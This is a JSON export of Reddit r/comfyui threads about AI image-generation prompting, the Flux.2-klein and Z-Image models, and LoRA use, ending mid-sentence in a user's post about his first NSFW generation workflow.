          "text": "Here's my output - \n\n**My input** \\- anime Love under the sky  \n**Prompt after adding the system prompt** \\-   \n  \nVisual Style:\n\nMakoto Shinkai and CoMix Wave Films aesthetics. High-fidelity 2D anime art characterized by hyper-detailed backgrounds, vibrant color palettes, and emotional depth. Kyoto Animation influence for character expressiveness.\n\n\n\nScene and Subject:\n\nA young anime couple standing close together on a wind-swept grassy hill or rooftop, silhouetted against a massive, breathtaking sky. They are holding hands or embracing, gazing upwards with a look of wonder and affection. A gentle breeze ruffles their hair and clothes, adding a sense of motion and transience.\n\n\n\nLighting and Sky:\n\nThe sky is the visual centerpiece, featuring towering majestic cumulonimbus clouds and a gradient transition from deep indigo to burning golden orange (Magic Hour). Volumetric sunbeams, lens flares, and sparkling atmospheric particles. A comet trail or first stars appearing in the twilight.\n\n\n\nTechnical Parameters:\n\n8K resolution, highly detailed cel shading with soft gradients, wide-angle composition to emphasize the scale of the sky, cinematic aspect ratio, sharp line work.\n\n\n\nNegative Constraints:\n\nNo 3D CGI render look, no photorealistic skin textures, no distorted faces, no extra fingers or limbs, no text or watermarks, no low-quality blur, no dull or desaturated colors.\n\nhttps://preview.redd.it/wp5e1uxj5agg1.png?width=1909&format=png&auto=webp&s=311bcdf48173335aaaf12a8911a1cce7fa614bde\n\n**RESULT**",
          "score": 5,
          "created_utc": "2026-01-29 12:15:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2edj6n",
              "author": "Deep-Huckleberry-752",
              "text": "amazing! Use the system prompt?",
              "score": 0,
              "created_utc": "2026-01-29 12:25:31",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2f020g",
                  "author": "Icy_Wrangler5613",
                  "text": "Yes",
                  "score": 1,
                  "created_utc": "2026-01-29 14:33:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2e2soc",
          "author": "No_Statement_7481",
          "text": "I wonder if this would actually work in not only nanobanana, I might actually try to generate some Z image after I am done with the lora I am making. Put it in my local LLM and get some promts from it.",
          "score": 2,
          "created_utc": "2026-01-29 11:04:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2e5exv",
              "author": "FrankNitty_Enforcer",
              "text": "Definitely, I‚Äôve got several presets (i.e. named system prompts) in LM Studio for things like ‚Äúltx2-i2v-prompter‚Äù, where I just keep pasting key tips and examples from model/workflow-specific prompting guides. I think this OP is going to elevate things a lot where it applies.\n\nAs usual for LLMs at least for me, a lot of the fun is in tweaking the prompt. Though at times I think it‚Äôs good exercise to try writing a good one by hand, just like with coding need to really understand what‚Äôs happening",
              "score": 2,
              "created_utc": "2026-01-29 11:26:15",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o2e4guu",
              "author": "dr_lm",
              "text": "You can use the griptape nodes and a free chutes account to do it automatically within comfyui: https://github.com/griptape-ai/ComfyUI-Griptape",
              "score": 1,
              "created_utc": "2026-01-29 11:18:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o2e0ldl",
          "author": "Wanderer43v3r",
          "text": "Looks wonderful! Thank you very much! Surely I will try.",
          "score": 2,
          "created_utc": "2026-01-29 10:46:12",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2e7dal",
              "author": "Deep-Huckleberry-752",
              "text": "Thanks!",
              "score": 2,
              "created_utc": "2026-01-29 11:41:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2ek79t",
          "author": "addandsubtract",
          "text": "Going through the dataset, lots of them use an input image (or several?) as guidance. Are you able to include them as well? It feels like the prompt is only half of the ingredient now.",
          "score": 1,
          "created_utc": "2026-01-29 13:08:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2elz4d",
              "author": "Deep-Huckleberry-752",
              "text": "Reference images are not included in the data, and many authors want users to use their own photos.",
              "score": 1,
              "created_utc": "2026-01-29 13:18:29",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2et4fy",
                  "author": "addandsubtract",
                  "text": "I'm also seeing lots of prompts that are cut off. Are you pulling them from the images or did the authors post them somewhere?",
                  "score": 1,
                  "created_utc": "2026-01-29 13:57:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2er3ny",
          "author": "SEOldMe",
          "text": "Here is a very good idea... Thanks!",
          "score": 1,
          "created_utc": "2026-01-29 13:46:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2f59gy",
          "author": "loneuniverse",
          "text": "Thanks I‚Äôll try this, but I have no clue who Wong Kar-wai or Saul Leite are.",
          "score": 1,
          "created_utc": "2026-01-29 14:58:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2f5t3y",
              "author": "Deep-Huckleberry-752",
              "text": "Haha, no worries! That's the magic of AI‚Äîyou don't need to know art history to get the look.\nFor context: Wong Kar-wai is a movie director famous for moody, emotional lighting (like 'In the Mood for Love'), and Saul Leiter was a photographer known for shooting through rainy windows and reflections.\nCombining them creates that specific 'lonely city at night' vibe automatically. Hope you get some cool results!",
              "score": 1,
              "created_utc": "2026-01-29 15:01:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2f6zrz",
          "author": "manBEARpigBEARman",
          "text": "Every model needs its own, separate system prompt. Best way to do it is feed the official documentation into an llm and ask it to use the doc to create the system prompt specifically for that model. That‚Äôs it.",
          "score": 1,
          "created_utc": "2026-01-29 15:06:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2f86dk",
              "author": "Deep-Huckleberry-752",
              "text": "Couldn't agree more. Ultimately, the creative vision matters more than the technical syntax",
              "score": 0,
              "created_utc": "2026-01-29 15:12:21",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2f92ad",
          "author": "zscan",
          "text": "What you actually want is the relation prompt->image, that is, how good does the image resemble what the prompt wants it to resemble. Sometimes you see these amazing images on civitai or somewhere and then you look at the prompt and the image is great, but it's not what the prompt actually asked it to do and not what the user intended to get.\n\nMy personal go to at the moment is to simply ask another AI to generate the prompt. I tell it my setup and what I want, the AI gives me a customized prompt for the model I'm using. Usually works pretty great and if it doesn't, you can tell the AI what's wrong and it can finetune it.",
          "score": 1,
          "created_utc": "2026-01-29 15:16:31",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2fd4yj",
              "author": "Deep-Huckleberry-752",
              "text": "Agreed, that's the right approach. I just feel that for most users, it's easier to tweak an existing base than to build one from zero",
              "score": 1,
              "created_utc": "2026-01-29 15:35:00",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2fdsb7",
          "author": "LyriWinters",
          "text": "and for which text encoder is this?\n\nNgl your post screams amateur hour instantly to me.",
          "score": 1,
          "created_utc": "2026-01-29 15:37:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2e4b41",
          "author": "fauni-7",
          "text": "Nice.",
          "score": 1,
          "created_utc": "2026-01-29 11:17:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2e7ems",
              "author": "Deep-Huckleberry-752",
              "text": "Thanks!",
              "score": 1,
              "created_utc": "2026-01-29 11:41:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qlhta9",
      "title": "Flux.2-klein: Forget LoRAs. High-precision prompting is all you need (and why I'm skeptical about Dual-Image workflows).",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qlhta9",
      "author": "That_Perspective5759",
      "created_utc": "2026-01-24 08:37:34",
      "score": 105,
      "num_comments": 37,
      "upvote_ratio": 0.93,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qlhta9/flux2klein_forget_loras_highprecision_prompting/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1eaknm",
          "author": "Gilgameshcomputing",
          "text": "Sorry, can you explain the difference between your examples? You say in text that you don't think two image editing is necessary, but you're clearly using two images in both the before and after examples.",
          "score": 10,
          "created_utc": "2026-01-24 08:53:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ebus2",
              "author": "That_Perspective5759",
              "text": "In the uploaded images, there are two examples. The style transfer in the image on the left was generated using both image references and style cue words, while the style transfer in the image on the right relied solely on prompts. I hope this explanation is clear.",
              "score": 10,
              "created_utc": "2026-01-24 09:04:56",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1ecdm4",
                  "author": "Gilgameshcomputing",
                  "text": "Ah okay. Yeah I see what you're doing now. How long were the prompts for the examples on the right? Have you got an example of one?",
                  "score": 3,
                  "created_utc": "2026-01-24 09:09:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1elp73",
          "author": "Agreeable_Effect938",
          "text": "Style transfer is not the main use case for dual-image mode. dual image is mostly good for object transfer.\n\nAnyway, styles require LORAs. It's all fun and games, until it comes to real production where generations require a very precise style that's impossible to achieve with a prompting. And then the models of recent years (basically everything after SDXL) have lost style flexibility and only produce corporate visuals a la ChatGPT illustrations, making prompting even more useless",
          "score": 8,
          "created_utc": "2026-01-24 10:36:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1e9kxv",
          "author": "Powerful_Evening5495",
          "text": "It is good in some tasks but fails in others \n\nI like the ability to relight and swap persons.",
          "score": 7,
          "created_utc": "2026-01-24 08:44:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1e9sh6",
              "author": "That_Perspective5759",
              "text": "Perhaps you could try modifying your prompt; it might improve the situation.",
              "score": 0,
              "created_utc": "2026-01-24 08:46:06",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1efrze",
          "author": "Electronic-Metal2391",
          "text": "If you would please change the pictures-comparison headings to English so we know what they mean.",
          "score": 11,
          "created_utc": "2026-01-24 09:41:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1elk3w",
              "author": "That_Perspective5759",
              "text": "You can understand it simply as follows: the image comparison on the left is a two-image editing workflow, while the image comparison on the right is a single-image editing workflow. The difference is that the former requires both an image reference and a prompt driver, while the latter only depends on the prompt driver.",
              "score": 4,
              "created_utc": "2026-01-24 10:34:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1eat0o",
          "author": "Leftover_tech",
          "text": "The girl in image number three just texted me (by mistake) about a terrific financial opportunity!",
          "score": 2,
          "created_utc": "2026-01-24 08:55:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ecw3h",
              "author": "That_Perspective5759",
              "text": "Lol! If she's offering you crypto, tell her my workflow can generate a better ROI than her 'opportunity'!",
              "score": 4,
              "created_utc": "2026-01-24 09:14:37",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1exvf5",
          "author": "reyzapper",
          "text": "Nice method, thx for the system prompt,\n\nyeah i prefer this method.\n\nhttps://preview.redd.it/kzi0hwt3iafg1.png?width=1874&format=png&auto=webp&s=d6188c9ad41141f4f4ba94cf1580a687eb156e55\n\n`Treat image1 as the ground truth. Lock the subject‚Äôs face, likeness, anatomy, pose, expression, and framing exactly as-is from image1. Apply a dark fantasy digital painting, ultra-detailed concept art, high-fidelity fantasy realism, emerald-green and gold color palette, jewel-toned saturation, bioluminescent accents, cinematic low-key lighting, mystical glow illumination, dramatic rim lighting, high contrast, ornate metallic textures, polished gold filigree, glowing energy effects, smooth painterly blending, hyper-detailed surfaces, fantasy illustration style, modern AAA game art aesthetic, epic high-fantasy influence.`",
          "score": 2,
          "created_utc": "2026-01-24 12:21:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f18vc",
              "author": "reyzapper",
              "text": "https://preview.redd.it/m2iu0v6pmafg1.png?width=1555&format=png&auto=webp&s=53b3a9f8b99da593782c29096afd4fec0619a985\n\nmore",
              "score": 1,
              "created_utc": "2026-01-24 12:46:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1fl5rt",
              "author": "That_Perspective5759",
              "text": "coolÔºÅ",
              "score": 1,
              "created_utc": "2026-01-24 14:46:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1eziil",
          "author": "_realpaul",
          "text": "If the model knows what youre prompting then it will apply the style, pose, details. If not then its off to loras. I mean thats why there are so many nsfw loras for every niche not in the training set or understood by the text encoder. \n\nThats not really anything new but good to see examples on flux klein.",
          "score": 2,
          "created_utc": "2026-01-24 12:33:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1fcysm",
          "author": "codexauthor",
          "text": "I believe dual image workflows are most useful when you want to put two different objects/subjects into an image and you need to maintain the likeness of each of them. But yes, prompt alone may be sufficient for style transfers if it's a style model knows or can recreate.",
          "score": 2,
          "created_utc": "2026-01-24 14:00:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1k7faj",
          "author": "oasuke",
          "text": "Nah, LoRAs will always be a thing especially for NSFW content. Large general models simply do not have the focused knowledge a lora can provide.",
          "score": 2,
          "created_utc": "2026-01-25 04:26:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1elniv",
          "author": "That_Perspective5759",
          "text": "You can understand it simply as follows: the image comparison on the left is a two-image editing workflow, while the image comparison on the right is a single-image editing workflow. The difference is that the former requires both an image reference and a prompt driver, while the latter only depends on the prompt driver.",
          "score": 1,
          "created_utc": "2026-01-24 10:35:35",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o1eowwf",
          "author": "Euchale",
          "text": "Problem is just if you want to go for the style of a specific artist (or mix two artists together).",
          "score": 1,
          "created_utc": "2026-01-24 11:05:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1izifl",
              "author": "That_Perspective5759",
              "text": "That's a really cool idea. Maybe we could give the two images to the LLM class and let it do this, outputting a prompt that blends the two styles. I think that might be effective.",
              "score": 1,
              "created_utc": "2026-01-25 00:19:58",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1g8vsi",
          "author": "_Biceps_",
          "text": "It's probably still faster for my smooth brain to just train a LoRA than to tweak a prompt to perfection.",
          "score": 1,
          "created_utc": "2026-01-24 16:40:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l5h52",
              "author": "FunDiscount2496",
              "text": "Not everything is describable, or better, description is not always the most efficient way so Loras are still needed",
              "score": 1,
              "created_utc": "2026-01-25 08:44:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gtsi1",
          "author": "Sad-Chemist7118",
          "text": "Where can we download your Forget LoRAs? I think I they look great!",
          "score": 1,
          "created_utc": "2026-01-24 18:12:10",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h8o8s",
              "author": "flasticpeet",
              "text": "üòÇ",
              "score": 1,
              "created_utc": "2026-01-24 19:16:02",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1izp5m",
              "author": "That_Perspective5759",
              "text": "You can download it from my Civitai site or RunningHub.",
              "score": 1,
              "created_utc": "2026-01-25 00:20:56",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1iqthi",
          "author": "budwik",
          "text": "How is flux.2-klein for these jobs in comparison to Qwen Edit?",
          "score": 1,
          "created_utc": "2026-01-24 23:34:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1iwegf",
              "author": "That_Perspective5759",
              "text": "better than qwen",
              "score": 1,
              "created_utc": "2026-01-25 00:03:52",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ebfea",
          "author": "FreezaSama",
          "text": "This is great. So... can you explain the prompting method?",
          "score": 0,
          "created_utc": "2026-01-24 09:01:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ecbz8",
              "author": "That_Perspective5759",
              "text": "The qwen3VL model can automatically recognize image styles and output prompts. In dual-image editing mode, the stylized image serves as a reference, working in conjunction with the prompts to drive the workflow. In single-image editing mode, the workflow uses only the prompts.",
              "score": 7,
              "created_utc": "2026-01-24 09:09:24",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1ecqzc",
              "author": "That_Perspective5759",
              "text": "I realized Flux.2-klein is so sensitive to semantics that standard prompts often carry too much \"noise.\" So, I designed an LLM Agent to act as a **Visual DNA Analyst**. Here‚Äôs the framework I use to generate the style prompts:\n\n# ü§ñ Agent System Prompt: Visual Essence Extractor\n\n**1. Role Definition** You are a premier Visual Arts Analyst and Prompt Engineering Specialist. Your mission is to deeply deconstruct the **\"Visual DNA\"** of an input image and translate it into a high-purity English Style Prompt for use in Stable Diffusion, Midjourney, or ComfyUI style transfer workflows.\n\n**2. Analytical Framework (Internal Scan)** When an image is provided, strictly analyze it across these five dimensions (do not output the analysis process, only the results):\n\n* **Artistic Medium & Technique:** e.g., Oil painting, digital 3D render, Ukiyo-e, cyberpunk photography, charcoal sketch.\n* **Color Palette & Harmony:** e.g., Monochromatic, complementary teal and orange, muted earth tones, neon-saturated.\n* **Lighting & Atmosphere:** e.g., Volumetric fog, cinematic rim lighting, high-key, soft bokeh, moody chiaroscuro.\n* **Texture & Grain:** e.g., Grainy film texture, thick impasto brushstrokes, glossy plastic, hyper-detailed skin pores.\n* **Artistic Influence/Era:** e.g., Studio Ghibli style, 1970s vintage aesthetic, brutalist architecture style.\n\n**3. Output Constraints**\n\n* **Direct Output:** Strictly NO preamble (e.g., \"Based on the image...\"), NO conclusions, and NO explanations.\n* **Language:** Must use pure, idiomatic English keywords.\n* **Format:** Use a comma-separated list (Tag-based style) to ensure balanced weights.\n* **Distillation:** Strip away all **Subject Matter** descriptions (e.g., \"a woman,\" \"a tree\"). Keep ONLY words that describe the **Style**.\n\n**4. Execution Logic**\n\n* **Input:** \\[Image\\]\n* **Task:** Extract the stylistic DNA.\n* **Output:** ONLY the English descriptive keywords for the style. No meta-talk.\n\n**üß™ Example Output:** *If inputting a cyberpunk rain-night photograph:* `Cinematic photography, cyberpunk aesthetic, rain-slicked surfaces, neon reflections, high contrast, moody teal and magenta color palette, anamorphic lens flare, sharp focus, volumetric night fog, grainy 35mm film texture, hyper-realistic, intricate urban detail.`\n\nGive it a shot and let me know if it helps your generations!",
              "score": 5,
              "created_utc": "2026-01-24 09:13:18",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1hr9cy",
                  "author": "Zueuk",
                  "text": "hmm, a comma separated list of 'tags'. isn't this literally what BFL's prompting guide tells us NOT to do ü§î",
                  "score": 2,
                  "created_utc": "2026-01-24 20:41:10",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ew5w8",
                  "author": "FreezaSama",
                  "text": "Oh this is dope. I'll use chat got to give it a go thanks!",
                  "score": 1,
                  "created_utc": "2026-01-24 12:07:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qo37cz",
      "title": "New Z-Image (base) Template in ComfyUI an hour ago!",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qo37cz/new_zimage_base_template_in_comfyui_an_hour_ago/",
      "author": "nymical23",
      "created_utc": "2026-01-27 04:00:40",
      "score": 97,
      "num_comments": 41,
      "upvote_ratio": 0.95,
      "text": "In the update to the workflow templates, a template to the Z-Image can be seen.\n\n[https://github.com/Comfy-Org/ComfyUI/pull/12102](https://github.com/Comfy-Org/ComfyUI/pull/12102)\n\nhttps://preview.redd.it/eqmcyzeeftfg1.png?width=2612&format=png&auto=webp&s=7aebfd4d1afcb8889ae19e452ea8346fcd000188\n\nhttps://preview.redd.it/i3jxwocfftfg1.png?width=3456&format=png&auto=webp&s=902851eb4f0c151c701bb11e866b5c4d08a32279\n\nThe download page for [the model](https://huggingface.co/Comfy-Org/z_image/resolve/main/split_files/diffusion_models/z_image_bf16.safetensors) is 404 for now.",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qo37cz/new_zimage_base_template_in_comfyui_an_hour_ago/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o1z17nt",
          "author": "No_Witness_7042",
          "text": "Two things that I am waiting for are gta6 and z-image omni base",
          "score": 16,
          "created_utc": "2026-01-27 06:37:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1zb68q",
              "author": "sergov",
              "text": "And Half Life 3 of course:D",
              "score": 10,
              "created_utc": "2026-01-27 08:02:54",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o20pzk0",
                  "author": "_realpaul",
                  "text": "Starcraft 3 and dont forget portal.",
                  "score": 1,
                  "created_utc": "2026-01-27 14:20:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1yg2qw",
          "author": "Prestigious-Basket43",
          "text": "It is happening.\n\n![gif](giphy|5mBE2MiMVFITS)",
          "score": 14,
          "created_utc": "2026-01-27 04:07:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yfszl",
          "author": "Moist_Range3926",
          "text": " Finally!!",
          "score": 6,
          "created_utc": "2026-01-27 04:05:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yxe52",
          "author": "Odd-Mirror-2412",
          "text": "It seems basic z-image, not omni-base.",
          "score": 4,
          "created_utc": "2026-01-27 06:07:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1z9bkc",
              "author": "LadenBennie",
              "text": "https://preview.redd.it/1scota3ujufg1.jpeg?width=549&format=pjpg&auto=webp&s=6476fa3ae8b52360fd8a391702526369b2fd47be\n\nCommit says it's omni model...",
              "score": 6,
              "created_utc": "2026-01-27 07:46:15",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o21iys0",
                  "author": "chum_is-fum",
                  "text": "This is exactly what we need, the base model can be finetuned to a much higher degree than the others. Let the illustriousing and ponying begin.",
                  "score": 4,
                  "created_utc": "2026-01-27 16:34:06",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1zauf1",
                  "author": "Odd-Mirror-2412",
                  "text": "Fantastic",
                  "score": 1,
                  "created_utc": "2026-01-27 07:59:57",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1zqb3o",
                  "author": "nymical23",
                  "text": "That commit is from last week. So, we can't know when omni will release.\n\nThis release only seems to be the base, as the template is only updated for base. Though, I do hope we get both together now, it seems unlikey.",
                  "score": 1,
                  "created_utc": "2026-01-27 10:22:51",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1z38a3",
              "author": "Zakki_Zak",
              "text": "What is the difference?",
              "score": 1,
              "created_utc": "2026-01-27 06:54:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1z5iai",
                  "author": "Odd-Mirror-2412",
                  "text": "Generation only, no editing.",
                  "score": 2,
                  "created_utc": "2026-01-27 07:12:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ymzq4",
          "author": "Icy_Prior_9628",
          "text": "https://preview.redd.it/fox6tresotfg1.jpeg?width=640&format=pjpg&auto=webp&s=a5922e67196be1ac5aa712b2a19201760b842dc5",
          "score": 4,
          "created_utc": "2026-01-27 04:51:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1znpsi",
          "author": "LORD_KILLZONO",
          "text": "So is the z-image base model out or not?",
          "score": 3,
          "created_utc": "2026-01-27 09:59:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1zpnvb",
              "author": "nymical23",
              "text": "Not yet, but Tongyi-Lab on twitter is also [hinting](https://x.com/Ali_TongyiLab/status/2016037984282304607) at it. Though they're being cryptic about it, so who knows really.",
              "score": 2,
              "created_utc": "2026-01-27 10:17:04",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1z9gvm",
          "author": "Misha_Vozduh",
          "text": "Do I understand correctly that the exciting thing about this is that it would open the way for more high quality finetunes?",
          "score": 2,
          "created_utc": "2026-01-27 07:47:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1zece2",
              "author": "nymical23",
              "text": "Yes, base model should be ideal for training.",
              "score": 4,
              "created_utc": "2026-01-27 08:32:08",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1zfpyx",
          "author": "Practical-Nerve-2262",
          "text": "  There's no download link for the model yet, let's wait a bit longer.",
          "score": 2,
          "created_utc": "2026-01-27 08:44:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o21bhfd",
          "author": "nalditopr",
          "text": "mode is up now",
          "score": 2,
          "created_utc": "2026-01-27 16:01:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21l686",
              "author": "nymical23",
              "text": "yay!",
              "score": 1,
              "created_utc": "2026-01-27 16:43:36",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1zdtb9",
          "author": "throwaway4whattt",
          "text": "Can anyone recommend any good resources to understand the use cases and Lora training basics for such a model? I'd love to learn more about this¬†",
          "score": 1,
          "created_utc": "2026-01-27 08:27:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "o20ataz",
              "author": "nymical23",
              "text": "Refer to my [this comment](https://www.reddit.com/r/StableDiffusion/comments/1qo38yp/comment/o1z8t0t/?context=3&utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button).\n\nThose repos have resources about the different settings they offer. I'll also recommend searching YouTube tutorials with their names. If you're a newbie, it might some time to digest all the learning. Keep going!",
              "score": 1,
              "created_utc": "2026-01-27 12:58:53",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1zy62g",
          "author": "shogun_mei",
          "text": "even with 404 seeing a URL with \"/z\\_image\\_bf16.safetensors\" give me chills",
          "score": 1,
          "created_utc": "2026-01-27 11:29:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1zzj4j",
          "author": "sukebe7",
          "text": "did you get it?",
          "score": 1,
          "created_utc": "2026-01-27 11:40:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o200hng",
              "author": "nymical23",
              "text": "No, it hasn't been released yet. Although, if we trust Tongyi-Lab's [cryptic tweet](https://x.com/Ali_TongyiLab/status/2016037984282304607), it should be available today. But who knows really.",
              "score": 1,
              "created_utc": "2026-01-27 11:47:55",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o207ypu",
                  "author": "somerandomperson313",
                  "text": "I want to belive, but i feel like this is like the 5th time that we expect it to release. They sure do know how to build some hype thoughüòÑ",
                  "score": 1,
                  "created_utc": "2026-01-27 12:40:53",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o209h6r",
          "author": "toooft",
          "text": "Explain to me, is this better than turbo?",
          "score": 1,
          "created_utc": "2026-01-27 12:50:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o20bakd",
              "author": "nymical23",
              "text": "For training? Yes.\n\nFor Inference? No.",
              "score": 3,
              "created_utc": "2026-01-27 13:01:50",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o20f5uw",
                  "author": "toooft",
                  "text": "Ah okay, thanks.",
                  "score": 1,
                  "created_utc": "2026-01-27 13:24:08",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2av7e6",
          "author": "cjwidd",
          "text": "So we would need to re-train LoRAs for this new model if we wanted to use a LoRA with it?",
          "score": 1,
          "created_utc": "2026-01-28 22:18:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2chh3z",
              "author": "nymical23",
              "text": "Yes, the turbo Loras are making the outputs a mess. Although, right now, people are generally not happy with Loras with the base either. We'll see how it goes.",
              "score": 1,
              "created_utc": "2026-01-29 03:27:17",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2d7vwi",
                  "author": "cjwidd",
                  "text": "seems like we are going through a hype cycle, and either the results are due to significant changes in the base model that affect LoRA training, or the base model is actually a regression (for one reason or another), compared to Turbo",
                  "score": 1,
                  "created_utc": "2026-01-29 06:28:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ysf9n",
          "author": "BeautyxArt",
          "text": "thank you for the screenshot (first image) of a workflow , bye.",
          "score": -6,
          "created_utc": "2026-01-27 05:29:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1yw9lf",
              "author": "nymical23",
              "text": "Update comfyui and load it from the templates. I just provided the screenshots for convenience as they were provided in the commit on the repo.",
              "score": 3,
              "created_utc": "2026-01-27 05:58:26",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qok1hi",
      "title": "I did it (NSFW)",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qok1hi/i_did_it_nsfw/",
      "author": "PomegranateNo7242",
      "created_utc": "2026-01-27 17:17:47",
      "score": 92,
      "num_comments": 56,
      "upvote_ratio": 0.75,
      "text": "Eight days back, I was new to comfyui and frustrated. I couldn't setup workflows correctly, or fix node issues, or understand what model goes where, what loras are, didn't know how to work with venv/pip. The post from me is [here](https://www.reddit.com/r/comfyui/comments/1qhf9i7/need_a_simple_nsfw_workflow_and_help_with/) (somewhat frustrated).\n\nThe name shouldn't really be comfyui (maybe it's a joke), maybe it should be something like \"model graph composer with a pretentious name to deceive the masses\". I dunno.\n\nEight days later, after a bunch of tutorials, crawling civit and hugging-face having setup multiple t2i, i2i, i2v workflows (didn't create from scratch, all were done on other's workflows as bases), I have my first \"production\". (Flux NSFW checkpoint for getting the model exactly to my liking from a significantly different source photo, this alone took 50+ iterations to get the face, figure I wanted, including iterations with QWEN rapid AIO nsfw - so many hits and misses because I'm a noob).\n\nScene link (deletes in 7 days): [LimeWire File Sharing](https://limewire.com/d/v9yCp#TNaPZ941ig)\n\nIt feels UNREAL to see this scene come to life, with the woman almost identical to what I had imagined for so long (the ethnic composition of her face needs a tad bit more Armenian phenotype and proportions, but it is 